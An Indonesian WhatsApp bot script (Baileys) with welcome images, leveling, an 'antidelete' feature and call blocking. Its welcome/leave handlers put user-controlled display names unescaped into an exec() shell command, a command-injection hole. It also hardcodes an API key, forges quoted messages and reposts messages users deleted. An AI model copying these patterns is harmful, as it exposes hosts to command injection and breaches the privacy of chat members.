//Ini Ada Yg Eror Dikit Tapi
//semua bot pasti ada eror!!
//Jangan Ubah Thx Rest Api Dan Thx To
//Ambil Case? Silahkan Gw baik
//Jgn Lupa Subscribe Yah 


//=====> THX TO <==========//
// Arifi Razzaq
// Fajar <Eleh>
// Angga <Gua Lah>
// ltsmeiky
// manikk
// Riu

//=========> Jgn Hapus Thxx To! <=============//
//=========> Subs FxAg Xc <=========//


// Next Full Rest Api Gw! 

const {
   WAConnection,
   MessageType,
   Presence,
   MessageOptions,
   Mimetype,
   WALocationMessage,
   WA_MESSAGE_STUB_TYPES,
   ReconnectMode,
   ProxyAgent,
   GroupSettingChange,
   waChatKey,
   mentionedJid,
   processTime,
} = require("@adiwajshing/baileys")
const qrcode = require("qrcode-terminal") 
const moment = require("moment-timezone") 
const fs = require("fs") 
const FormData = require('form-data')
const crypto = require('crypto')
const util = require('util')
const imageToBase64 = require('image-to-base64')
const axios = require('axios')
const { color, bgcolor } = require('./lib/color')
const { bahasa } = require('./lib/bahasa')
const { negara } = require('./lib/kodenegara')
const { donasi } = require('./lib/donasi')
const { developer } = require('./lib/developer')
const { randompict } = require('./lib/randompict')
const { fetchJson } = require('./lib/fetcher')
const { recognize } = require('./lib/ocr')
const fontPath = ('./lib/Zahraaa.ttf')
const path = require('path')
const { exec, spawn } = require("child_process")
const { wait, simih, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, banner, start, info, success, sleep, close } = require('./lib/functions')
const tiktod = require('tiktok-scraper')
const brainly = require('brainly-scraper')
const ffmpeg = require('fluent-ffmpeg')
const cd = 4.32e+7
const { removeBackgroundFromImageFile } = require('remove.bg')
const { ind } = require('./bahasa')
const { uploadimg } = require('./lib/uploadimg')

/********** MENU SETTING **********/
const vcard = 'BEGIN:VCARD\n' 
            + 'VERSION:3.0\n' 
            + 'FN:Angga.\n' //Ini Nama kontak lu
            + 'ORG: Creator Bot;\n' 
            + 'TEL;type=CELL;type=VOICE;waid=6285283427860:+62 85283427860\n'  //ini kontak/nomor lu
            + 'END:VCARD'
            
const vcard1 = 'BEGIN:VCARD\n' // JAN DI GANTI
            + 'VERSION:3.0\n' // JAN DI GANTI
            + 'FN:Arifi Razzaqq\n' // JAN DI GANTI TOD NTAR EROR
            + 'ORG:Owner 2;\n' // GANTI AJA
            + 'TEL;type=CELL;type=VOICE;waid=6289646775713:+62 896-4677-5713\n' // JAN DI GANTI TOD
            + 'END:VCARD' // JAN DI GANTI
        
numbernye = '0@s.whatsapp.net'
fake = 'Xbotxyz' //Ini fake
prefix = '#' // All Prefix Gayss
blocked = []   
limitawal = 99999 //limit
memberlimit = 1 //maksimal member limit
cr1 = '*By AnggaGanzz*'
freply = '*Ahayyy*'
cr = '*AnggaGanzzNihbod*' //fake reply
LoLKey = "YOUR_APIKEY" // BELI SU?
TobzKey = "291F6uRDLIhlSpHp1hOy" //APIKEY TOBZ
XteamKey = "AnggaBotWa" //BELI SU
AnggaKey = "AnggaGanz" // itu Di bawah Desk yt gw
namo = 'AnggaGanzz' //Bisa ubah / ga tapi hati hati
ator = '+6285283427860' //author
fakereply = 'Xbotxyz' //fake reply
fakereply1 = 'Xbotxyz' //fakereply

/******** OWNER NUMBER**********/
const ownerNumber = ["6285283427860@s.whatsapp.net"]   //ganti nomor lu! 
const pacarNumber = ["6289646775713@s.whatsapp.net"]  //ganti nomor lu!  
/************************************/

       
/*********** LOAD FILE ***********/
const tebakgambar = JSON.parse(fs.readFileSync('./database/tebakgambar.json'))
const setiker = JSON.parse(fs.readFileSync('./strg/stik.json'))
const videonye = JSON.parse(fs.readFileSync('./strg/video.json'))
const audionye = JSON.parse(fs.readFileSync('./strg/audio.json'))
const imagenye = JSON.parse(fs.readFileSync('./strg/image.json'))
const _leveling = JSON.parse(fs.readFileSync('./database/kelompok/leveling.json'))
const antilink = JSON.parse(fs.readFileSync('./database/kelompok/antilink.json'))
const _level = JSON.parse(fs.readFileSync('./database/pengguna/level.json'))
const _registered = JSON.parse(fs.readFileSync('./database/pengguna.json'))
const afk = JSON.parse(fs.readFileSync('./database/afk.json'))
const welkom = JSON.parse(fs.readFileSync('./database/bot/welkom.json'))
const nsfw = JSON.parse(fs.readFileSync('./database/bot/nsfw.json'))
const samih = JSON.parse(fs.readFileSync('./database/bot/simi.json'))
const event = JSON.parse(fs.readFileSync('./database/bot/event.json'))
const _limit = JSON.parse(fs.readFileSync('./database/pengguna/limit.json'))
const uang = JSON.parse(fs.readFileSync('./database/pengguna/uang.json'))
const ban = JSON.parse(fs.readFileSync('./database/pengguna/banned.json'))
const prem = JSON.parse(fs.readFileSync('./database/pengguna/premium.json'))
const adm = JSON.parse(fs.readFileSync('./database/pengguna/admin.json'))
const bad = JSON.parse(fs.readFileSync('./database/kelompok/bad.json'))
const badword = JSON.parse(fs.readFileSync('./database/kelompok/badword.json'))
/*********** END LOAD ***********/

/********** FUNCTION ***************/
const getLevelingXp = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const getLevelingLevel = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }

        const getLevelingId = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].id
            }
        }

        const addLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/pengguna/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/pengguna/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (sender) => {
            const obj = {id: sender, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/pengguna/level.json', JSON.stringify(_level))
        }
             
         const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }

        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/pengguna.json', JSON.stringify(_registered))
        }

        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
        
        const addATM = (sender) => {
        	const obj = {id: sender, uang : 0}
            uang.push(obj)
            fs.writeFileSync('./database/pengguna/uang.json', JSON.stringify(uang))
        }
        
        const addKoinUser = (sender, amount) => {
            let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang += amount
                fs.writeFileSync('./database/pengguna/uang.json', JSON.stringify(uang))
            }
        }
        
        const checkATMuser = (sender) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return uang[position].uang
            }
        }
        
        const bayarLimit = (sender, amount) => {
        	let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit -= amount
                fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
            }
        }
        	
        const confirmATM = (sender, amount) => {
        	let position = false
            Object.keys(uang).forEach((i) => {
                if (uang[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                uang[position].uang -= amount
                fs.writeFileSync('./database/pengguna/uang.json', JSON.stringify(uang))
            }
        }
        
         const limitAdd = (sender) => {
             let position = false
            Object.keys(_limit).forEach((i) => {
                if (_limit[i].id == sender) {
                    position = i
                }
            })
            if (position !== false) {
                _limit[position].limit += 1
                fs.writeFileSync('./database/pengguna/limit.json', JSON.stringify(_limit))
            }
        }
             
        
function kyun(seconds){
  function pad(s){
    return (s < 10 ? '0' : '') + s;
  }
  var hours = Math.floor(seconds / (60*60));
  var minutes = Math.floor(seconds % (60*60) / 60);
  var seconds = Math.floor(seconds % 60);

  //return pad(hours) + ':' + pad(minutes) + ':' + pad(seconds)
  return `${pad(hours)} Jam ${pad(minutes)} Menit ${pad(seconds)} Detik`
}
/********** FUNCTION ***************/
var date = new Date();

var tahun = date.getFullYear();

var bulan = date.getMonth();
var tanggal = date.getDate();
var hari = date.getDay();
var jams = date.getHours();
var menit = date.getMinutes();
var detik = date.getSeconds();


switch(hari) {
 case 0: hari = "Minggu"; break;
 case 1: hari = "Senin"; break;
 case 2: hari = "Selasa"; break;
 case 3: hari = "Rabu"; break;
 case 4: hari = "Kamis"; break;
 case 5: hari = "Jum'at"; break;
 case 6: hari = "Sabtu"; break;
}
switch(bulan) {
 case 0: bulan = "Januari"; break;
 case 1: bulan = "Februari"; break;
 case 2: bulan = "Maret"; break;
 case 3: bulan = "April"; break;
 case 4: bulan = "Mei"; break;
 case 5: bulan = "Juni"; break;
 case 6: bulan = "Juli"; break;
 case 7: bulan = "Agustus"; break;
 case 8: bulan = "September"; break;
 case 9: bulan = "Oktober"; break;
 case 10: bulan = "November"; break;
 case 11: bulan = "Desember"; break;
}
            switch(jams){
                case 0: jams = "Tengah Malam🌃"; break;
                case 1: jams = "Tengah Malam🌃"; break;
                case 2: jams = "Tengah Malam🌃"; break;
                case 3: jams = "Tengah Malam🌃"; break;
                case 4: jams = "Sahur🍙"; break;
                case 5: jams = "Subuh🕌"; break;
                case 6: jams = "Pagi🏙"; break;
                case 7: jams = "Pagi🏙"; break;
                case 8: jams = "Pagi🏙"; break;
                case 9: jams = "Pagi🏙"; break;
                case 10: jams = "Pagi🏙"; break;
                case 11: jams = "Siang🌁"; break;
                case 12: jams = "Dzuhur🕌"; break;
                case 13: jams = "Siang🌁"; break;
                case 14: jams = "Siang🌁"; break;
                case 15: jams = "Ashar🕌"; break;
                case 16: jams = "Sore🌇"; break;
                case 17: jams = "Petang🌆"; break;
                case 18: jams = "Buka Puasa👨‍👩‍👧‍👦"; break;
                case 19: jams = "isya🕌"; break;
                case 20: jams = "Malam🌆"; break;
                case 21: jams = "Malam🌆"; break;
                case 22: jams = "Oyasumi Nassai🌌"; break;
                case 23: jams = "Tengah Malam🌃"; break;
            }
var tampilTanggal = hari + " "+ tanggal + " " + bulan + " " + tahun;
var tampilWaktu = "Jam: " + jams + ":" + menit + ":" + detik;
var tampilHari = "" + jams;

console.log(tampilTanggal);
console.log(tampilWaktu);

const Angga = new WAConnection()
   Angga.on('qr', qr => {
   qrcode.generate(qr, { small: true })
   console.log(color('[','white'),color('∆','red'),color(']','white'),color('QR code is ready, Scan now..','white'),color('SUBSCRIBE','red'),color('BRUH','lime'),color('FxAG Xc','red'))
})

Angga.on('credentials-updated', () => {
	const authInfo = Angga.base64EncodedAuthInfo()
   console.log(`credentials updated!`)
   fs.writeFileSync('./session.json', JSON.stringify(authInfo, null, '\t'))
})
fs.existsSync('./session.json') && Angga.loadAuthInfo('./session.json')
Angga.connect();



Angga.on('group-participants-update', async (anu) => {
	if (!welkom.includes(anu.jid)) return
	try {
		const mdata = await Angga.groupMetadata(anu.jid)
		console.log(anu)
		if (anu.action == 'add') {
			num = anu.participants[0]
			const moment = require('moment-timezone')
const jm = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			let d = new Date
				let locale = 'id'
					let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
					let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
					let week = d.toLocaleDateString(locale, { weekday: 'long' })
					let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})
pushnem = Angga.contacts[num] != undefined ? Angga.contacts[num].notify = undefined ? PhoneNumber('+' + num.replace('@s.whatsapp.net', '')).getNumber('international') : Angga.contacts[num].notify || Angga.contacts[num].vname : PhoneNumber('+' + num.replace('@s.whatsapp.net', '')).getNumber('international')
			try {
				ppimg = await Angga.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
			} catch {
				ppimg = './src/image/pp.jpeg'
			}
				exec(`magick './src/wel.jpg' -gravity west -fill '#ff2fa2' -font './src/font-gue.ttf' -size 1280x710 -pointsize 75 -interline-spacing 7.5 -annotate +460-45 '${pushnem}' -pointsize 35 -annotate +460+83 '${jm} ${calender}' -pointsize 50 -annotate +460+200 'Welcome To ${mdata.subject}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+70 -composite 'hasil.jpg'`)
				.on('error', () => reply('error'))
				.on('exit', () => {
			Angga.sendMessage(mdata.id, fs.readFileSync('hasil.jpg'), MessageType.image, {caption: `*Met Dateng🗿, Jan lupa intro dan baca rules bruh...* @${num.split('@')[0]}`, contextInfo: { mentionedJid: [num] }})
			})
		} else if (anu.action == 'remove') {
		num = anu.participants[0]
		const moment = require('moment-timezone')
const jamny = moment.tz('Asia/Jakarta').format('HH:mm:ss')
			let d = new Date
				let locale = 'id'
					let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
					let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
					let week = d.toLocaleDateString(locale, { weekday: 'long' })
					let calender = d.toLocaleDateString(locale, {
				day: 'numeric',
				month: 'long',
				year: 'numeric'
				})
pushnem = Angga.contacts[num] != undefined ? Angga.contacts[num].notify = undefined ? PhoneNumber('+' + num.replace('@s.whatsapp.net', '')).getNumber('international') : Angga.contacts[num].notify || Angga.contacts[num].vname : PhoneNumber('+' + num.replace('@s.whatsapp.net', '')).getNumber('international')
			try {
				ppimg = await Angga.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
			} catch {
				ppimg = './src/image/pp.jpeg'
			}
				exec(`magick './src/lev.jpg' -gravity west -fill '#ff2fa2' -font './src/font-gue.ttf' -size 1280x710 -pointsize 70 -interline-spacing 7.5 -annotate +460-45 '${pushnem}' -pointsize 35 -annotate +460+83 '${jamny} ${calender}' -pointsize 50 -annotate +460+200 'Leaving from ${mdata.subject}' '${ppimg}' -resize %[fx:t?u.w*0.2:u.w]x%[fx:?u.h*0.2:u.h] -gravity center -geometry -430+70 -composite 'hasil.jpg'`)
				.on('error', () => reply('error'))
				.on('exit', () => {
			Angga.sendMessage(mdata.id, fs.readFileSync('hasil.jpg'), MessageType.image, {caption: `*Sayonara👋🏻*@${num.split('@')[0]}\n`, contextInfo: { mentionedJid: [num] }})
			})
		}
	} catch (e) {
		console.log(e)
	}
	})
	Angga.on('CB:Blocklist', json => {
		if (blocked.length > 2) return
	    for (let i of json[1].blocklist) {
	    	blocked.push(i.replace('c.us','s.whatsapp.net'))
	    }
	})
	Angga.on('message-update', async (mek) => {
		try {
	   const from = mek.key.remoteJid
		const messageStubType = WA_MESSAGE_STUB_TYPES[mek.messageStubType] || 'MESSAGE'
		const dataRevoke = JSON.parse(fs.readFileSync('./src/gc-revoked.json'))
		const dataCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked.json'))
		const dataBanCtRevoke = JSON.parse(fs.readFileSync('./src/ct-revoked-banlist.json'))
		const sender = mek.key.fromMe ? Angga.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
		const isRevoke = mek.key.remoteJid.endsWith('@s.whatsapp.net') ? true : mek.key.remoteJid.endsWith('@g.us') ? dataRevoke.includes(from) : false
		const isCtRevoke = mek.key.remoteJid.endsWith('@g.us') ? true : dataCtRevoke.data ? true : false
		const isBanCtRevoke = mek.key.remoteJid.endsWith('@g.us') ? true : !dataBanCtRevoke.includes(sender) ? true : false
		if (messageStubType == 'REVOKE') {
			console.log(`Status untuk grup : ${!isRevoke}\nStatus semua kontak : ${!isCtRevoke}\nStatus kontak dikecualikan : ${!isBanCtRevoke}`)
			if (!isRevoke) return
			if (!isCtRevoke) return
			if (!isBanCtRevoke) return
			const from = mek.key.remoteJid
			const isGroup = mek.key.remoteJid.endsWith('@g.us') ? true : false
			let int
			let infoMSG = JSON.parse(fs.readFileSync('./src/.dat/msg.data.json'))
			const id_deleted = mek.key.id
			const conts = mek.key.fromMe ? Angga.user.jid : Angga.contacts[sender] || { notify: jid.replace(/@.+/, '') }
			const pushname = mek.key.fromMe ? Angga.user.name : conts.notify || conts.vname || conts.name || '-'
			const opt4tag = {
				contextInfo: { mentionedJid: [sender] }
			}
			for (let i = 0; i < infoMSG.length; i++) {
				if (infoMSG[i].key.id == id_deleted) {
					const dataInfo = infoMSG[i]
					const type = Object.keys(infoMSG[i].message)[0]
					const timestamp = infoMSG[i].messageTimestamp
					int = {
						no: i,
						type: type,
						timestamp: timestamp,
						data: dataInfo
					}
				}
			}
			const index = Number(int.no)
			const body = int.type == 'conversation' ? infoMSG[index].message.conversation : int.type == 'extendedTextMessage' ? infoMSG[index].message.extendedTextMessage.text : int.type == 'imageMessage' ? infoMSG[index].message.imageMessage.caption : int.type == 'stickerMessage' ? 'Sticker' : int.type == 'audioMessage' ? 'Audio' : int.type == 'videoMessage' ? infoMSG[index].videoMessage.caption : infoMSG[index]
			const mediaData = int.type === 'extendedTextMessage' ? JSON.parse(JSON.stringify(int.data).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : int.data
			var itsme = `${numbernye}`
				var split = `${fake}`
				// var taged = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
				var selepbot72 = {
					contextInfo: {
						participant: itsme,
						quotedMessage: {
							extendedTextMessage: {
								text: split,
							}
						}
					}
				}
			if (int.type == 'conversation' || int.type == 'extendedTextMessage') {
				const strConversation = `─────────────────────
◪ *ANTIDELETE*
│
└ ❏ Nama : *${pushname}*
    ❏ Nomer : ${sender.replace('@s.whatsapp.net', '')}
    ❏ Tipe : Text
    ❏ Waktu : *${moment.unix(int.timestamp).format('HH:mm:ss')}*
    ❏ Tanggal : *${moment.unix(int.timestamp).format('DD/MM/YYYY')}*
    ❏ Pesan : *${body ? body : '-'}*
─────────────────────`
				Angga.sendMessage(from, strConversation, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
			} else if (int.type == 'stickerMessage') {
				var itsme = `${numbernye}`
					var split = `${fake}`
					const pingbro23 = {
						contextInfo: {
							participant: itsme,
							quotedMessage: {
								extendedTextMessage: {
									text: split,
								}
							}
						}
					}
				const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
				const savedFilename = await Angga.downloadAndSaveMediaMessage(int.data, `./media/sticker/${filename}`);
				const strConversation = `─────────────────────
◪ *ANTIDELETE*
│
└ ❏ Nama : *${pushname}*
    ❏ Nomer : ${sender.replace('@s.whatsapp.net', '')}
    ❏ Tipe : Text
    ❏ Waktu : *${moment.unix(int.timestamp).format('HH:mm:ss')}*
    ❏ Tanggal : *${moment.unix(int.timestamp).format('DD/MM/YYYY')}*
─────────────────────`

				const buff = fs.readFileSync(savedFilename)
				Angga.sendMessage(from, strConversation, MessageType.text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				Angga.sendMessage(from, buff, MessageType.sticker, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "productMessage":{"product":{"productImage":{"mimetype":"image/jpeg","height":736,"width":736,"jpegThumbnail":fs.readFileSync(`./me.jpg`)},"productId":"3937202479680283","title":"Xbotxyz","currencyCode":"IDR","priceAmount1000":"1000000000000000","productImageCount":1},"businessOwnerJid":"0@s.whatsapp.net"}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				// console.log(stdout)
				fs.unlinkSync(savedFilename)

			} else if (int.type == 'imageMessage') {
				var itsme = `${numbernye}`
					var split = `${fake}`
					const pingbro22 = {
						contextInfo: {
							participant: itsme,
							quotedMessage: {
								extendedTextMessage: {
									text: split,
								}
							}
						}
					}
				const filename = `${sender.replace('@s.whatsapp.net', '')}-${moment().unix()}`
				const savedFilename = await Angga.downloadAndSaveMediaMessage(int.data, `./media/revoke/${filename}`);
				const buff = fs.readFileSync(savedFilename)
				const strConversation = `─────────────────────
◪ *ANTIDELETE*
│
└ ❏ Nama : *${pushname}*
    ❏ Nomer : ${sender.replace('@s.whatsapp.net', '')}
    ❏ Tipe : Text
    ❏ Waktu : *${moment.unix(int.timestamp).format('HH:mm:ss')}*
    ❏ Tanggal : *${moment.unix(int.timestamp).format('DD/MM/YYYY')}*
    ❏ Pesan : ${body ? body : '-'}\`\`\`
─────────────────────`
				Angga.sendMessage(from, buff, MessageType.image, { contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [sender] }, caption: strConversation })
				fs.unlinkSync(savedFilename)
			}
		}
	} catch (e) {
		console.log('Message : %s', color(e, 'green'))
		// console.log(e)
	}
})
	fakeimagecuy = fs.readFileSync('me.jpg')
   	        const mek2 =  {key: { fromMe: false,remoteJid: "status@broadcast", participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 99, status: 200, thumbnail: fakeimagecuy, surface: 200, message: fakereply, orderTitle: fakereply1, sellerJid: '0@s.whatsapp.net'} } }              	 	         
	Angga.on('message-new', async (mek) => {
		try {
			if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		let infoMSG = JSON.parse(fs.readFileSync('./src/.dat/msg.data.json'))
		infoMSG.push(JSON.parse(JSON.stringify(mek)))
		fs.writeFileSync('./src/.dat/msg.data.json', JSON.stringify(infoMSG, null, 2))
		const urutan_pesan = infoMSG.length
		if (urutan_pesan === 5000) {
			infoMSG.splice(0, 4300)
			fs.writeFileSync('./src/.dat/msg.data.json', JSON.stringify(infoMSG, null, 2))
		}
			if (!mek.message) return
			if (mek.key && mek.key.remoteJid == 'status@broadcast') return
			if (mek.key.fromMe) return
			global.prefix
			global.blocked
			const content = JSON.stringify(mek.message)
			const from = mek.key.remoteJid
			mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
			const type = Object.keys(mek.message)[0]
			const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
			const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
			const timi = moment.tz('Asia/Jakarta').add(30, 'days').calendar();
			const timu = moment.tz('Asia/Jakarta').add(20, 'days').calendar();
			const wita = moment.tz('Asia/Makassar').format('HH:mm:ss')
			const wit = moment.tz('Asia/Jayapura').format('HH:mm:ss')
			body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
			budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
			var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
			var Link = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
			const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()
			const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
			const args = body.trim().split(/ +/).slice(1)
			const isCmd = body.startsWith(prefix)
			const tescuk = ["0@s.whatsapp.net"]
			const isGroup = from.endsWith('@g.us')
			const q = args.join(' ')
			const botNumber = Angga.user.jid
			const sender = isGroup ? mek.participant : mek.key.remoteJid
			pushname = Angga.contacts[sender] != undefined ? Angga.contacts[sender].vname || Angga.contacts[sender].notify : undefined
			const groupMetadata = isGroup ? await Angga.groupMetadata(from) : ''
			const groupName = isGroup ? groupMetadata.subject : ''
			const groupId = isGroup ? groupMetadata.jid : ''
			const groupMembers = isGroup ? groupMetadata.participants : ''
			const groupDesc = isGroup ? groupMetadata.desc : ''
			const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
			const mentionByTag = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.mentionedJid : []
			const mentionByReply = type == "extendedTextMessage" && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.participant || "" : ""
			const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
			mention != undefined ? mention.push(mentionByReply) : []
			const mentionUser = mention != undefined ? mention.filter(n => n) : []
            
            /************** SCURITY FEATURE ************/
            const isEventon = isGroup ? event.includes(from) : false
            const isBadWord = isGroup ? badword.includes(from) : false
            const isRegistered = checkRegisteredUser(sender)
            const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
            const isLevelingOn = isGroup ? _leveling.includes(from) : false
			const isGroupAdmins = groupAdmins.includes(sender) || false
			const isWelkom = isGroup ? welkom.includes(from) : false
			const isNsfw = isGroup ? nsfw.includes(from) : false
			const isSimi = isGroup ? samih.includes(from) : false
			const isAntilink = isGroup ? antilink.includes(from) : false
			const isOwner = ownerNumber.includes(sender)
			const isPacar = pacarNumber.includes(sender)
			const isBanned = ban.includes(sender)
			const isPremium= prem.includes(sender)
			const isAdmin = adm.includes(sender)
			const isImage = type === 'imageMessage'
			const isUrl = (url) => {
			    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
			const reply = (teks) => {
				Angga.sendMessage(from, teks, text, {quoted:mek})
			}
			const sendMess = (hehe, teks) => {
				Angga.sendMessage(hehe, teks, text)
			}
			const mentions = (teks, memberr, id) => {
				(id == null || id == undefined || id == false) ? Angga.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : Angga.sendMessage(from, teks.trim(), extendedText, {quoted: mek, contextInfo: {"mentionedJid": memberr}})
			}
			const sendImage = (teks) => {
		    Angga.sendMessage(from, teks, image, {quoted:mek})
		    }
		    const costum = (pesan, tipe, target, target2) => {
			Angga.sendMessage(from, pesan, tipe, {quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` }}})
			}
		    const sendPtt = (teks) => {
		    Angga.sendMessage(from, audio, mp3, {quoted:mek})
		    }
		    // jgn ubah² ntar eror!
Angga.on('CB:action,,call', async json => {
    const callerId = json[2][0][1].from;
    console.log("call dari "+ callerId)
        Angga.sendMessage(callerId, "Telpon = Block Tq..\n", MessageType.text)
        await sleep(4000)
        await Angga.blockUser(callerId, "add") // Block user
})
	        /*****************END SCURITY FEATURE ********/
			
function addMetadata(packname, author) {	
	if (!packname) packname = 'WABot'; if (!author) author = 'Bot';	
	author = author.replace(/[^a-zA-Z0-9]/g, '');	
	let name = `${author}_${packname}`
	if (fs.existsSync(`./${name}.exif`)) return `./${name}.exif`
	const json = {	
		"sticker-pack-name": packname,
		"sticker-pack-publisher": author,
	}
	const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
	const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

	let len = JSON.stringify(json).length	
	let last	

	if (len > 256) {	
		len = len - 256	
		bytes.unshift(0x01)	
	} else {	
		bytes.unshift(0x00)	
	}	

	if (len < 16) {	
		last = len.toString(16)	
		last = "0" + len	
	} else {	
		last = len.toString(16)	
	}	

	const buf2 = Buffer.from(last, "hex")	
	const buf3 = Buffer.from(bytes)	
	const buf4 = Buffer.from(JSON.stringify(json))	

	const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

	fs.writeFile(`./${name}.exif`, buffer, (err) => {	
		return `./${name}.exif`	
	})	

}

		//role level
        const levelRole = getLevelingLevel(sender)
        var role = 'Newbie ㋡'
        if (levelRole <= 2) {
            role = 'Newbie ㋡'
        } else if (levelRole <= 4) {
            role = 'Beginner Grade 1 ⚊¹'
